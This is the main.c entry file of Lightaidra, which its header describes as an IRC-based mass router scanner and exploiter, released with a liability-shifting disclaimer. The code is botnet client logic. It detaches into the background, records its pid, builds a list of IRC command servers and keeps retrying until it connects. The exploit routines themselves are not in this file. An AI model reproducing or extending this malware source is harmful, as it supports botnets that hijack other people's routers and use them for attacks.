/*
 * main.c - USE LIGHTAIDRA AT YOUR OWN RISK!
 *
 * Lightaidra - IRC-based mass router scanner/exploiter.
 * Copyright (C) 2008-2015 Federico Fazzi, <eurialo@deftcode.ninja>.
 *
 * LEGAL DISCLAIMER: It is the end user's responsibility to obey 
 * all applicable local, state and federal laws. Developers assume 
 * no liability and are not responsible for any misuse or damage 
 * caused by this program.
 *
 */

#include "../include/headers.h"

void daemonize();
void create_irc_servlist();
int connect_to_irc(sock_t * sp);

int main(int argc, char **argv) {
    sock_t *sp;

    if (!background_mode) daemonize();

    pidprocess();

    for (counter = 0; counter <= 10; counter++) isrv[counter] = (char *)malloc(32);
    
    counter = 0;
    create_irc_servlist();

retry:

    sleep(2);
    sp = (sock_t *) malloc(sizeof(sock_t));

    if (connect_to_irc(sp)) {
        if (background_mode) printf("!Lightaidra: connection failed to %s!", isrv[counter]);

        if (counter <= total) counter++;
        else counter = 0;

        free(sp);
        goto retry;
    }

    return EXIT_SUCCESS;
}
